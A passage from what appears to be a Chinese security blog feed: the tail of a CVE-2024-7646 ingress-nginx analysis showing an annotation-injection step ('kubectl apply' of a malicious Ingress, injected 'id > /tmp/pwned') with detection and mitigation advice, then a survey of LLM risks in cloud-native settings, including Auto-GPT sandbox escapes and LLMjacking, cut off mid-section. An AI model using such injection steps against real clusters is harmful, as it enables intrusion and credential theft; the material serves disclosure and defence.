/tmp/pwned)&quot;</span><br></code></pre></td></tr></table></figure><h3 id="4-3-应用恶意-Ingress"><a href="#4-3-应用恶意-Ingress" class="headerlink" title="4.3 应用恶意 Ingress"></a>4.3 应用恶意 Ingress</h3><p>然后再将该 Ingress 对象应用到该集群中。</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">kubectl apply -f malicious-ingress.yaml<br></code></pre></td></tr></table></figure><h3 id="4-4-命令执行"><a href="#4-4-命令执行" class="headerlink" title="4.4 命令执行"></a>4.4 命令执行</h3><p>当 ingress-nginx 处理这个 Ingress 对象时，因为无法验证注释，从而导致所注入的恶意命令被执行。</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-built_in">id</span> &gt; /tmp/pwned<br></code></pre></td></tr></table></figure><h3 id="4-5-凭证"><a href="#4-5-凭证" class="headerlink" title="4.5 凭证"></a>4.5 凭证</h3><p>一旦攻击者成功执行了命令，他们就可能获取到 ingress-nginx 控制器的认证信息，这些信息在集群中可能拥有广泛的访问权限。</p><h2 id="0x05-风险分析"><a href="#0x05-风险分析" class="headerlink" title="0x05 风险分析"></a>0x05 风险分析</h2><p>以下 Kubernetes 环境将受到特别高的威胁：</p><ul><li>非管理员用户有权创建 Ingress 对象的多租户 Kubernetes 环境。</li><li>使用默认配置部署 ingress-nginx 的集群，授予对集群 secret 的广泛访问权限。</li><li>没有严格的 RBAC 策略来限制谁可以创建或修改 Ingress 对象的环境。</li></ul><h2 id="0x06-检测方法"><a href="#0x06-检测方法" class="headerlink" title="0x06 检测方法"></a>0x06 检测方法</h2><ol><li><p>检查是否安装了<code>ingress-nginx</code>。</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">kubectl get po -A | grep ingress-nginx-controller<br></code></pre></td></tr></table></figure></li><li><p>若已安装，请检查版本。</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">kubectl <span class="hljs-built_in">exec</span> -it &lt;ingress-nginx-pod&gt; -n &lt;namespace&gt; -- /nginx-ingress-controller --version<br></code></pre></td></tr></table></figure></li></ol><h2 id="0x07-缓解措施"><a href="#0x07-缓解措施" class="headerlink" title="0x07 缓解措施"></a>0x07 缓解措施</h2><ol><li><strong>更新 ingress-nginx 的版本：</strong> 将 ingress-nginx 升级至 v1.11.2 或更新的版本。</li><li><strong>检查 Ingress 资源：</strong> 对现有的 Ingress 资源进行审计，检查是否有任何可疑的注释，特别需要检查是否包含回车符（<code>\r</code>）。</li><li><strong>执行严格的基于角色的访问控制（RBAC）：</strong> 只允许受信任的用户和服务账户创建和修改 Ingress 资源。</li><li><strong>开启 Kubernetes 的审计日志功能：</strong> 寻找是否存在利用该漏洞的行为。</li><li><strong>采用准入控制：</strong> 部署<code>ValidatingAdmissionWebhooks</code>，以对 Ingress 资源及其注解进行更严格的校验。</li></ol><h2 id="0x08-总结"><a href="#0x08-总结" class="headerlink" title="0x08 总结"></a>0x08 总结</h2><p>CVE-2024-7646 事件提醒我们，保护 Kubernetes 环境的安全是一项持续进行、永无休止的任务。在 ingress-nginx 这类关键组件中绕过注解验证的能力凸显了保持软件最新、执行严格访问控制和持续监测安全威胁的重要性。</p><p>随着 Kubernetes 在信息技术基础设施中的影响力日益增强，保持警觉并积极采取措施确保其安全变得尤为关键。定期进行安全审查、及时更新补丁以及遵循角色基础访问控制（RBAC）和网络安全策略的最佳实践，是确保强大安全防护的关键策略。</p><p>请记住，为了保持安全，您需要不断更新系统，并确保您的 Kubernetes 集群能够抵御新出现的威胁。您可以从使用安全工具与平台对您的集群进行扫描开始，以获取关于您安全状况的最新信息。</p><p>详情请看 Kubernetes 官方的安全公告：</p><p><a href="https://github.com/kubernetes/kubernetes/issues/126744" title="CVE-2024-7646: Ingress-nginx Annotation Validation Bypass">CVE-2024-7646: Ingress-nginx Annotation Validation Bypass</a></p>]]></content>
    
    
    
    <tags>
      
      <tag>CVE 漏洞分析</tag>
      
      <tag>Kubernetes 安全</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>云原生场景下的大模型应用风险</title>
    <link href="/2024/08/16/%E4%BA%91%E5%8E%9F%E7%94%9F%E5%9C%BA%E6%99%AF%E4%B8%8B%E7%9A%84%E5%A4%A7%E6%A8%A1%E5%9E%8B%E5%BA%94%E7%94%A8%E9%A3%8E%E9%99%A9/"/>
    <url>/2024/08/16/%E4%BA%91%E5%8E%9F%E7%94%9F%E5%9C%BA%E6%99%AF%E4%B8%8B%E7%9A%84%E5%A4%A7%E6%A8%A1%E5%9E%8B%E5%BA%94%E7%94%A8%E9%A3%8E%E9%99%A9/</url>
    
    <content type="html"><![CDATA[<h2 id="0x00-前言"><a href="#0x00-前言" class="headerlink" title="0x00 前言"></a>0x00 前言</h2><p>2022 年底，随着 ChatGPT 进入大众市场，人们对大型语言模型（LLM，Large Language Model）的关注尤为浓厚。渴望利用 LLM 潜力的企业正在迅速将其整合到其运营和面向客户的产品中。</p><p>然而，LLM 的采用速度已经超过了全面安全协议的建立速度，导致许多应用程序容易受到高风险问题的影响。</p><p><strong>本文，我们将以 OWASP LLM top 10 作为切入点，剖析云原生场景下的 LLM 风险。</strong></p><h2 id="0x01-OWASP-LLM-top10"><a href="#0x01-OWASP-LLM-top10" class="headerlink" title="0x01 OWASP LLM top10"></a>0x01 OWASP LLM top10</h2><p>随着 GPT、Llama 2 和 Gemini 等 LLM 的涌现，LLM 相关的安全风险也受到了大家的关注，例如</p><ul><li><a href="https://simonwillison.net/2022/Sep/12/prompt-injection/" title="针对 GPT-3 的即时注入攻击">针对 GPT-3 的即时注入攻击</a></li><li><a href="https://embracethered.com/blog/posts/2023/chatgpt-plugin-vulns-chat-with-code/" title="可以访问网站并窃取源代码的LLM插件漏洞">可以访问网站并窃取源代码的 LLM 插件漏洞</a></li><li><a href="https://security.snyk.io/vuln/SNYK-PYTHON-LANGCHAIN-5411357" title="影响langchain的任意代码执行漏洞">影响 langchain 的任意代码执行漏洞</a></li><li>……</li></ul><p>当时，LLM 还没有统一的资源来解决这些安全问题，很多开发者也对 LLM 的相关风险不够了解。为了解决这个问题，2023 年 10 月 16 日，来自不同背景的近 500 名专家和超过 125 名积极贡献者在其专业知识的基础上，进行了一个月的集思广益，提出了 LLM 潜在的 43 个不同风险。经过多轮的讨论和投票，<a href="https://owasp.org/www-project-top-10-for-large-language-model-applications/" title="OWASP">OWASP</a>最终将这些提案细化为十大最关键漏洞的简明列表。</p><table><thead><tr><th>序号</th><th>风险名称</th><th>风险描述</th></tr></thead><tbody><tr><td>LLM01</td><td>提示词 (Prompt) 注入 (Injection)</td><td>黑客通过设计过的输入 (提示词) 操纵大型语言模型 (LLM)，从而导致 LLM 执行意外操作。提示词注入会覆盖系统提示词，而间接注入操纵外部数据源进行注入攻击。</td></tr><tr><td>LLM02</td><td>不安全的输出处理</td><td>当 LLM 输出未经审查而被接受时，就会出现此漏洞，从而暴露后端系统。&#xA;滥用可能会导致 XSS、CSRF、SSRF、权限升级或远程代码执行等严重后果。</td></tr><tr><td>LLM03</td><td>训练数据中毒</td><td>当 LLM 培训数据被篡改，引入损害安全性、有效性或道德行为的漏洞或偏见时，就会发生这种情况。来源包括 Common Crawl、WebText、OpenWebText 和书籍。</td></tr><tr><td>LLM04</td><td>拒绝服务模型</td><td>攻击者对大型语言模型进行资源密集型操作，导致服务降级或高成本。由于 LLM 的资源密集型性质和用户输入的不可预测性，该漏洞被放大。</td></tr><tr><td>LLM05</td><td>供应链漏洞</td><td>LLM 应用程序生命周期可能会受到易受攻击的组件或服务的影响，从而导致安全攻击。使用第三方数据集、预先训练的模型和插件可能会增加漏洞。</td></tr><tr><td>LLM06</td><td>敏感信息披露</td><td>LLM 可能会在其回复中泄露机密数据，从而导致未经授权的数据访问、隐私侵犯和安全漏洞。实施数据清理和严格的用户策略来缓解这种情况至关重要。</td></tr><tr><td>LLM07</td><td>不安全的插件设计</td><td>LLM 插件可能具有不安全的输入和不足的访问控制。缺乏应用程序控制使它们更容易被利用，并可能导致远程代码执行等后果。</td></tr><tr><td>LLM08</td><td>过度代理</td><td>基于 LLM 的系统可能会采取导致意想不到的后果的行动。该问题源于授予基于 LLM 的系统过多的功能、权限或自主权。</td></tr><tr><td>LLM09</td><td>过度依赖</td><td>过度依赖 LLM 而不受监督的系统或人员可能会因 LLM 生成的不正确或不适当的内容而面临错误信息、沟通不畅、法律问题和安全漏洞。</td></tr><tr><td>LLM10</td><td>模型盗窃</td><td>这涉及对专有 LLM 模型的未经授权的访问、复制或泄露。影响包括经济损失、竞争优势受损以及敏感信息的潜在访问。</td></tr></tbody></table><h2 id="0x02-云原生人工智能（CNAI）"><a href="#0x02-云原生人工智能（CNAI）" class="headerlink" title="0x02 云原生人工智能（CNAI）"></a>0x02 云原生人工智能（CNAI）</h2><p>与人工智能一样，云原生作为当今最关键的技术趋势，也为应用程序的运行提供了可扩展且可靠的平台，正稳步成为主要的云工作负载。2024 年 3 月 19 日，CNCF 发布了<a href="https://www.cncf.io/reports/cloud-native-artificial-intelligence-whitepaper/" title="《Cloud Native Artificial Intelligence Whitepaper》">《Cloud Native Artificial Intelligence Whitepaper》</a>（云原生人工智能白皮书），介绍了当今最先进的 AI&#x2F;ML（artificial intelligence and machine learning，人工智能和机器学习）技术，帮助工程师和业务成员了解不断变化的云原生人工智能生态系统及其机遇。</p><p><img src="/image/image_z6qn7bZI8w.png" alt="图 1：cloud native AI" title="图1：cloud native AI"></p><p>云原生人工智能（CNAI，Cloud Native Artificial Intelligence）技术使得构建、部署、运行和扩展 AI 应用变得更加高效和实用。这项技术解决了 AI 应用开发者和科学家在云平台上面临的一系列挑战，包括开发、部署、运行、扩展和监控 AI 工作负载等方面。通过充分利用云基础设施的计算资源（如 CPU 和 GPU）、网络和存储能力，并结合有效的资源隔离和共享机制，CNAI 技术显著提升了 AI 应用的性能，并有助于降低运营成本。</p><p><img src="/image/image_hadc0WRcug.png" alt="图 2：相关技术和技能" title="图2：相关技术和技能"></p><p>不仅如此，云原生对于人工智能的价值在云服务提供商和（或）人工智能公司发布的文章中得以体现，例如：</p><ul><li>2023 年 5 月 24 日，<a href="https://huggingface.co/blog/hugging-face-endpoints-on-azure" title="Hugging Face 与微软合作在 Azure 上推出 Hugging Face 模型目录">Hugging Face 与微软合作在 Azure 上推出 Hugging Face 模型目录</a>；</li><li>2016 年 8 月 29 日，OpenAI 发表了一篇名为<a href="https://openai.com/index/infrastructure-for-deep-learning/" title="《Infrastructure for deep learning》">《Infrastructure for deep learning》</a>的文章。在这篇文章中，OpenAI 揭示了他们将<a href="https://github.com/openai/kubernetes-ec2-autoscaler" title="kubernetes-ec2-autoscaler">kubernetes-ec2-autoscaler</a>作为 Kubernetes 上的普通的 pod 运行，对集群进行批量优化；</li><li>2018 年 1 月 18 日，OpenAI 宣布他们已经<a href="https://openai.com/index/scaling-kubernetes-to-2500-nodes/" title="将Kubernetes 扩展到2500个节点">将 Kubernetes 扩展到 2500 个节点</a>了；</li><li>2021 年 1 月 25 日，OpenAI 再次宣布他们已将<a href="https://openai.com/index/scaling-kubernetes-to-7500-nodes/" title="Kubernetes 集群扩展到7500个节点">Kubernetes 集群扩展到 7500 个节点</a>，可为<a href="https://arxiv.org/abs/2005.14165" title="GPT-3">GPT-3</a>、<a href="https://openai.com/index/clip/" title="CLIP">CLIP</a> 和<a href="https://openai.com/index/dall-e/" title="DALL·E">DALL·E</a>大模型提供一个可扩展的基础设置，同时也适用于快速的小规模迭代研究（例如<a href="https://arxiv.org/abs/2001.08361" title="神经语言模型的扩展法则">神经语言模型的扩展法则</a>）</li><li>……</li></ul><p>OpenAI 最大规模的工作负载是直接管理的裸云虚拟机，而 Kubernetes 由于快速的迭代周期、合理的可扩展性以及几乎不用写样板代码的特性，成为了 OpenAI 团队大多数实验的理想选择。接下来，我们以 OpenAI 团队的 LLM 基础设施实践作为案例，介绍当前 LLM 算力结构和应用架构。</p><h3 id="2-1-高效资源调度与弹性扩展"><a href="#2-1-高效资源调度与弹性扩展" class="headerlink" title="2.1 高效资源调度与弹性扩展"></a>2.1 高效资源调度与弹性扩展</h3><p>云原生平台以其灵活的调度能力，能够迅速响应计算资源的需求，实现资源的弹性扩展与收缩。这一特性对于执行大型机器学习任务尤为重要，因为这些任务在全面利用每个节点的硬件资源时，能够达到最优的运行效率。</p><p>OpenAI 团队借助<a href="https://kubernetes.io/docs/reference/command-line-tools-reference/kube-scheduler/" title="kube-scheduler">kube-scheduler</a>的动态调度功能，有效提升了资源利用率和运行效率。这种调度方式使得 GPU 之间能够通过<a href="https://www.nvidia.com/en-us/data-center/nvlink/" title="NVLink">NVLink</a>实现直接的交叉通信，同时也能通过<a href="https://developer.nvidia.com/gpudirect" title="GPUDirect">GPUDirect</a>技术与 NIC 进行直接通信。</p><p>在 OpenAI 的众多工作负载中，常见做法是一个 pod 独占整个节点，从而避免了 NUMA、CPU 或 PCIE 资源竞争的问题。此外，OpenAI 集群拥有的完整对分带宽，无需担忧机架或网络拓扑的限制。</p><p>得益于这些优化措施，即使管理着众多节点，调度器的压力也相对较轻。不过，需要注意的是，kube-scheduler 的压力具有突发性，新作业的启动可能会引发数百个 pod 的即时创建，但随后资源的变动率会迅速降低。</p><p><img src="/image/image_HhWxWR0KgO.png" alt="图 3：OpenAI 的 kube-scheduler 的调度压力" title="图3：OpenAI 的 kube-scheduler 的调度压力"></p><h3 id="2-2-容器化与微服务架构"><a href="#2-2-容器化与微服务架构" class="headerlink" title="2.2 容器化与微服务架构"></a>2.2 容器化与微服务架构</h3><p>通过容器化技术，人们可以将 AI 应用和模型打包为独立的容器，使其具备良好的可移植性和可部署性。OpenAI 的 Kubernetes 要求每个作业都是一个 Docker 容器，以具备以来隔离和代码快照的能力，使 AI 算力可以在不同的环境中运行。</p><p>然而，构建一个新的 Docker 容器可能会为研究人员的迭代周期增加宝贵的额外秒数，因此 OpenAI 团队还提供工具，将代码透明地从研究人员的笔记本电脑传输到标准镜像中。此外，微服务结构将应用拆分为多个独立的微服务。每个微服务负责特定的功能，使得 LLM 的开发和维护变得更加简单和灵活。</p><p><img src="/image/image_S0WY3twU1K.png" alt="图 4：TensorBoard 中的模型学习曲线" title="图4：TensorBoard 中的模型学习曲线"></p><h3 id="2-3-云原生基础设施转型"><a href="#2-3-云原生基础设施转型" class="headerlink" title="2.3 云原生基础设施转型"></a>2.3 云原生基础设施转型</h3><p>在探讨理想的批处理作业性能时，OpenAI 团队注意到，虽然将集群中的节点数量加倍理论上能使作业运行时间减半，但在深度学习中，尤其是大型语言模型（LLM）的运算中，使用多 GPU 往往只能带来<a href="https://research.googleblog.com/2016/04/announcing-tensorflow-08-now-with.html" title="非常次线性">非常次线性</a>的加速效果。因此，为了实现顶级性能，他们不仅依赖于顶级的 GPU，还注重于 LLM 基础设施的云原生化。</p><p>OpenAI 团队在处理 CPU 密集型任务，如运行<a href="https://gym.openai.com/envs#box2d" title="模拟器">模拟器</a>、<a href="https://gym.openai.com/envs#atari" title="强化学习环境或小规模模型">强化学习环境或小规模模型</a>时，大量使用了 CPU 资源。这些任务在 GPU 上的运行速度并不更快，因此云原生化基础设施的灵活性和可扩展性在这里显得尤为重要。</p><p><img src="https://images.ctfassets.net/kftzwdyauwt9/fc705186-3c3d-40eb-a2f96b4d94d5/6f3d0e0703333fd51f9719225cea0632/infra_img_3.png?w=3840&q=90&fm=webp" alt="图 5：nvidia-smi 显示满载的 Titan Xs" title="图5：nvidia-smi 显示满载的 Titan Xs"></p><p>得益于<a href="https://aws.amazon.com/" title="AWS">AWS</a> 慷慨捐赠的大量计算资源，OpenAI 团队得以在云原生基础设施中运行 CPU 实例，并横向扩展 GPU 作业。此外，团队也运行着自己的物理服务器，主要配备 <a href="http://www.geforce.com/hardware/10series/titan-x-pascal" title="Titan X">Titan X</a> GPU，这些服务器与云资源无缝集成，共同构成了一个云原生化的混合云架构。</p><p><img src="https://images.ctfassets.net/kftzwdyauwt9/a52d26e1-f8c2-4ffa-7f4eff0762f5/5326f78c72a04f09816a670ec4dbfc05/infra_img_4.png?w=3840&q=90&fm=webp" alt="图 6：同一台物理机器上运行的 htop 显示有大量的空闲 CPU" title="图6： 同一台物理机器上运行的 htop 显示有大量的空闲 CPU"></p><p>OpenAI 团队长期采用混合云架构，这不仅是因为他们需要尝试不同的 GPU、互连和其他可能对深度学习未来重要的技术，而且还因为他们认识到，基础设施的云原生化对于提供简洁、一致的管理界面至关重要。他们使用 <a href="https://www.terraform.io/" title="Terraform">Terraform</a>来设置 AWS 云资源，确保了云原生基础设施的自动化和一致性。</p><p><img src="https://images.ctfassets.net/kftzwdyauwt9/d402e835-f111-40e6-28379f980e29/9914c96270cca97d124bee3faba1a0c9/infra_img_5.png?w=1200&q=90&fm=webp" alt="图 7：OpenAI 的部分 Terraform 配置片段，用于管理自动伸缩" title="图7：OpenAI 的部分 Terraform配置片段，用于管理自动伸缩"></p><p>OpenAI 的 LLM 基础设施云原生化体现在他们对 Kubernetes 的使用上，它不仅作为物理机和 AWS 节点的集群调度程序，而且还允许研究人员通过 Kubernetes 的 flannel 网络无缝访问他们正在运行的作业网络。这种架构的灵活性使得无论是小规模还是大规模的作业，都能在云原生化的基础设施中得到有效支持。</p><p><img src="/image/image_-XX-bnC7gr.png" alt="图 8：OpenAI 团队的 Kubernetes 集群的启动配置" title="图8：OpenAI 团队的Kubernetes 集群的启动配置"></p><h2 id="0x03-云原生场景下的-LLM-风险"><a href="#0x03-云原生场景下的-LLM-风险" class="headerlink" title="0x03 云原生场景下的 LLM 风险"></a>0x03 云原生场景下的 LLM 风险</h2><p>在向云原生场景过渡的过程中，LLM 面临多种风险，这些风险包括算力平台、算力网络、AI 应用以及左移风险。</p><h3 id="3-1-算力平台风险"><a href="#3-1-算力平台风险" class="headerlink" title="3.1 算力平台风险"></a>3.1 算力平台风险</h3><p>算力平台风险是指在使用云计算等算力平台进行大型语言模型训练和推理时可能面临的一系列潜在威胁，包括算力环境逃逸、算力滥用和持久化后门等。</p><h4 id="3-1-1-持久化后门"><a href="#3-1-1-持久化后门" class="headerlink" title="3.1.1 持久化后门"></a>3.1.1 持久化后门</h4><p>持久化后门指的是攻击者在云原生环境中植入的隐藏入口点，这些入口点可以在攻击者与受感染系统之间建立长期的、未经授权的通信渠道。在 AI 领域，持久化后门可能被植入到 LLM 模型中，使得攻击者能够在不被察觉的情况下远程访问、操纵或窃取模型数据。</p><p>由于后门可能非常隐蔽，它们可能在很长时间内都未被检测到，从而允许攻击者持续地访问和利用受感染的 AI 服务。在云原生环境中，由于服务的动态性和复杂性，检测和防御持久化后门变得更加困难，需要采用持续的安全监控、代码审计和异常行为分析等手段。</p><h4 id="3-1-2-算力滥用"><a href="#3-1-2-算力滥用" class="headerlink" title="3.1.2 算力滥用"></a>3.1.2 算力滥用</h4><p>算力滥用是指攻击者不正当地使用计算资源，以达到非法目的。例如：通过过度占用 LLM 的计算资源来进行恶意训练、执行非法推理任务或进行加密货币挖矿等行为。算力滥用不仅会导致云服务提供商的成本增加，还可能影响其他租户的服务质量，甚至可能导致整个云服务的性能下降。</p><h4 id="3-1-3-算力环境逃逸"><a href="#3-1-3-算力环境逃逸" class="headerlink" title="3.1.3 算力环境逃逸"></a>3.1.3 算力环境逃逸</h4><p>在云原生环境中，攻击者利用软件漏洞、配置错误或不当的权限设置，从一个受限制的算力环境（如容器、虚拟机或沙箱）中逃逸出来，获得对底层主机或其他租户资源的未授权访问。例如：在 LLM 执行的过程中，攻击者通过某种方式突破运行时的限制，访问或控制其他容器或服务。</p><p>2023 年 6 月 7 日到 6 月 14 日，<a href="https://positive.security/" title="Positive Security">Positive Security</a>的安全工程师 <a href="https://www.linkedin.com/in/lukas-euler-bba6a3139/?locale=en_US" title="Lukas Euler">Lukas Euler</a>在尝试使用<a href="https://autogpt.net/" title="Auto-GPT">Auto-GPT</a>的时候，发现了不可靠的代码执行和 Docker 逃逸，后来他通过改进有效载荷以实现可靠的代码执行并确定 ANSI 控制序列注入，当他尝试寻找更可靠、更广泛的 ANSI 控制序列注入时，却未成功。</p><p><img src="/image/image_h_73lzYCRU.png" alt="图 9：Auto-GPT RCE 漏洞利用路径" title="图9：Auto-GPT RCE 漏洞利用路径"></p><p><img src="/image/1111_Qe3IENqDi8.png" alt="图 10：注入 ANSI 控制序列 \u001b[0;32m 以打印绿色" title="图 10：注入 ANSI 控制序列 \u001b[0;32m 以打印绿色"></p><p>2023 年 7 月 11 日 Auto-GPT 团队修复了该漏洞并发布了 3 篇安全公告。</p><p><img src="/image/image_27lSMotZPV.png" alt="图 11：Auto-GPT 团队修复了该漏洞并发布了 3 篇安全公告" title="图 11： Auto-GPT 团队修复了该漏洞并发布了3篇安全公告"></p><p>2023 年 7 月 13 日，NVD 给漏洞“<a href="https://github.com/Significant-Gravitas/AutoGPT/security/advisories/GHSA-x5gj-2chr-4ch6" title="Docker escape when running from docker-compose.yml included in git repo">Docker escape when running from docker-compose.yml included in git repo</a>”颁布了编号 CVE-2023-37273，并将其威胁等级评为“高危”，该漏洞可以覆盖 docker-compose.yml 文件并进行滥用，在下次启动 Auto-GPT 时会获得主机系统的控制权限。</p><p><img src="/image/image_-o8_fcifCo.png" alt="图 12：CVE-2023-37273 漏洞" title="图 12：CVE-2023-37273 漏洞"></p><p>同时，漏洞“<a href="https://github.com/Significant-Gravitas/AutoGPT/security/advisories/GHSA-5h38-mgp9-rj5f" title="Python code execution sandbox escape in non-docker version">Python code execution sandbox escape in non-docker version</a>”被颁布了<a href="https://nvd.nist.gov/vuln/detail/CVE-2023-37274" title="CVE-2023-37274">CVE-2023-37274</a>编号，该漏洞可以在运行 Auto-GPT 的主机上执行任意代码，进一步造成持久化攻击。</p><p><img src="/image/image_PSswyBCAm1.png" alt="图 13：CVE-2023-37274 漏洞" title="图 13：CVE-2023-37274 漏洞"></p><h3 id="3-2-算力网络风险"><a href="#3-2-算力网络风险" class="headerlink" title="3.2 算力网络风险"></a>3.2 算力网络风险</h3><p>算力网络风险主要是指在云原生环境中，由于网络的开放性、复杂性以及资源共享的特性，导致 LLM 在处理大量数据时可能面临的安全威胁和风险。这包括横向攻击、跨租户算力调度和 DDoS 等方面威胁。</p><h4 id="3-2-1-横向攻击"><a href="#3-2-1-横向攻击" class="headerlink" title="3.2.1 横向攻击"></a>3.2.1 横向攻击</h4><p>横向攻击是指攻击者在突破了 LLM 系统的某个点（例如，通过利用漏洞或泄露的凭据）之后，开始在云基础设施内部横向移动，以访问更多的资源、数据或服务。</p><p>由于云原生架构通常涉及多个微服务和容器，这些服务之间可能有广泛的网络连接，攻击者可以利用这些连接来扩展其攻击范围。</p><p>在 LLM 的上下文中，横向攻击可能导致攻击者访问敏感的模型数据、窃取训练数据、或者甚至篡改模型行为，从而对整个 AI 服务的可信度和安全性造成威胁。</p><h4 id="3-2-2-跨租户算力调度"><a href="#3-2-2-跨租户算力调度" class="headerlink" title="3.2.2 跨租户算力调度"></a>3.2.2 跨租户算力调度</h4><p>跨租户算力调度是指攻击者通过利用云平台的安全漏洞或配置错误，能够在不同租户之间非法调度或访问计算资源。</p><p>在 LLM 的应用场景中，这意味着攻击者可能能够访问其他租户的模型实例或计算资源，从而进行未授权的操作，如窃取模型参数、执行恶意训练任务或进行资源耗尽攻击。</p><p>这种风险强调了在云环境中实施严格的安全隔离和资源管理策略的重要性，以防止租户之间的不当访问和资源滥用。</p><h4 id="3-2-3-DDoS-攻击"><a href="#3-2-3-DDoS-攻击" class="headerlink" title="3.2.3 DDoS 攻击"></a>3.2.3 DDoS 攻击</h4><p>DDoS 攻击是指攻击者通过控制大量的僵尸网络或利用云服务的可扩展性，向目标 LLM 服务发送大量伪造的请求，目的是耗尽服务器的带宽、计算资源或 API 请求配额，从而使得合法用户无法访问服务。</p><p>对于 LLM 来说，DDoS 攻击可能导致模型服务不可用，影响用户体验，甚至可能导致业务中断。在云原生环境中，由于云服务通常是高度动态和分布式的，防御 DDoS 攻击变得更加复杂，这需要采用多层次的安全策略和自动化的流量管理措施来减轻其影响。根据 OWASP 的描述，DDoS 对 LLM 应用造成了重大的威胁，因此任何 LLM 应用在开发过程中都必须解决这一威胁。</p><p><img src="/image/image_vpnamQiLac.png" alt="图 14：DDoS 的原理" title="图14：DDoS的原理"></p><p>尽管拒绝服务攻击通常旨在超载系统资源，但它们也可能利用系统行为的其他方面，例如 API 限制。2023 年 8 月 31 日，<a href="https://sourcegraph.com/blog/security-update-august-2023" title="Sourcegraph经历了一次安全事件">Sourcegraph 经历了一次安全事件</a>，攻击者使用泄露的管理员访问令牌来更改 API 速率限制，从而可能引发服务中断。</p><p><a href="https://sourcegraph.com/" title="sourcegraph">sourcegraph</a>通过其人工智能编码助手 Cody，为开发人员提供了直接在编辑器中快速搜索、编写和理解代码的能力。然而，这一事件凸显了在云原生环境下，即使是高度自动化的服务也面临着严峻的安全挑战。2023 年 8 月 30 日，sourcegraph 的安全团队发现 API 的使用量显著提升，并开始调查原因。</p><p><img src="/image/image_dZ2JeiTKNC.png" alt="图 15：sourcegraph 的安全团队发现 API 的使用量显著提升" title="图15：sourcegraph 的安全团队发现 API 的使用量显著提升"></p><p>经过调查发现，在 7 月 14 日提交的代码时，站点管理员的访问令牌在拉取请求的过程中意外泄漏，攻击者在其公共的 Sourcegraph 实例中使用了泄漏的管理员访问 token，并利用该权限提高了用户的 API 速率限制。</p><p>Sourcegraph 承诺免费提供 API 访问，吸引了大量用户创建账户并开始使用代理应用程序。这个应用程序及其使用说明在网络上迅速传播，产生了近 200 万次浏览。随着用户数量的激增，越来越多的人通过创建免费的 Sourcegraph.com 账户并添加访问令牌，非法访问 Sourcegraph API，导致了异常高的请求量，最终可能导致服务中断。这一事件不仅揭示了云原生环境下的安全风险，也强调了在开放网络中保护 API 的重要性。</p><h3 id="3-3-AI-应用风险"><a href="#3-3-AI-应用风险" class="headerlink" title="3.3 AI 应用风险"></a>3.3 AI 应用风险</h3><p>AI 应用风险是指在人工智能系统，特别是 LLM 等 AI 应用中存在的潜在威胁和风险。这些风险包括传统攻击和 LLM API 滥用等方面。</p><h4 id="3-3-1-传统攻击"><a href="#3-3-1-传统攻击" class="headerlink" title="3.3.1 传统攻击"></a>3.3.1 传统攻击</h4><p>传统攻击指的是在 AI 系统中利用已知的攻击手段，如注入恶意代码、利用软件漏洞等。</p><p>2024 年 4 月 16 日，基于 TensorFlow 的 Keras 模型中的一个<a href="https://kb.cert.org/vuls/id/253266" title="安全漏洞">安全漏洞</a>被纰漏，并被命名为<a href="http://web.nvd.nist.gov/vuln/detail/CVE-2024-3660" title="CVE-2024-3660">CVE-2024-3660</a>。该漏洞存在于 2.13 版本之前的 Lambda 层中。利用这个漏洞，攻击者可以在构建 Keras 模型时注入任意代码。当加载和使用这些第三方模型时，可能会导致任意不受信任的代码在机器学习应用程序环境中以特权级别执行。</p><p><img src="/image/image_zyv7v8V0zX.png" alt="图 16：CVE-2024-3660 漏洞详情" title="图16：CVE-2024-3660 漏洞详情"></p><p>攻击者可以使用此功能对热门模型进行木马病毒攻击，保存并重新分发，从而污染依赖 AI&#x2F;ML 应用程序的供应链。</p><h4 id="3-3-2-LLM-API-滥用"><a href="#3-3-2-LLM-API-滥用" class="headerlink" title="3.3.2 LLM API 滥用"></a>3.3.2 LLM API 滥用</h4><p>LLM API 滥用是指攻击者利用大型语言模型的 API 接口进行非法操作或获取敏感信息。在云原生环境中，这种风险尤为突出。</p><p>2024 年 5 月 6 日，Sysdig 威胁研究团队观察到的<a href="https://sysdig.com/blog/llmjacking-stolen-cloud-credentials-used-in-new-ai-attack" title="LLMjacking攻击">LLMjacking 攻击</a>，就是利用窃取的云凭证针对云托管的大型语言模型服务发动的。这些凭证是从一个常见目标获得的，即运行易受攻击的 Laravel 版本 ( <a href="https://nvd.nist.gov/vuln/detail/CVE-2021-3129" title="CVE-2021-3129">CVE-2021-3129</a> ) 的系统。</p><p><img src="/image/Asset-33-2048x645_cc2rNxu0Ze.png" alt="图 17：LLMjacking 的攻击原理" title="图17：LLMjacking 的攻击原理"></p><p>在本次攻击中，攻击者通过在云环境中使用看似合法的 InvokeModel API  请求，巧妙地测试了访问边界，而不会立即触发警报。它不仅证实了对 LLM 的访问存在，还证实了这些服务处于活动状态。</p><p>在这次攻击事件中，Anthropic 的本地 Claude (v2&#x2F;v3) LLM 模型成为攻击目标。如果未被发现，这种类型的攻击可能导致受害者每天花费超过 46,000 美元的 LLM 消费成本。Sysdig 研究人员发现，LLM 反向代理被用于提供对受感染账户的访问权限，这表明其存在经济动机。然而，另一个可能的动机是提取 LLM 训练数据。</p><h3 id="3-4-左移风险"><a href="#3-4-左移风险" class="headerlink" title="3.4 左移风险"></a>3.4 左移风险</h3><p>在云原生场景下，左移（Shift Left）风险是指在软件开发和部署的早期阶段就存在的安全风险。对于 LLM 来说，左移风险通常涉及到在模型开发、训练、打包和部署过程中可能引入的安全风险。常见的风险有：</p><h4 id="3-4-1-AI-应用镜像构建投毒"><a href="#3-4-1-AI-应用镜像构建投毒" class="headerlink" title="3.4.1 AI 应用镜像构建投毒"></a>3.4.1 AI 应用镜像构建投毒</h4><p>在云原生场景下，AI 应用的镜像构建过程是一个关键环节。所谓的镜像构建投毒，指的是在构建 AI 应用镜像时，恶意代码被悄悄植入到镜像中。这种风险可能导致训练数据和模型参数被窃取、LLM 的功能受到破坏甚至影响到应用的正常运行。</p><h4 id="3-4-2-后门风险"><a href="#3-4-2-后门风险" class="headerlink" title="3.4.2 后门风险"></a>3.4.2 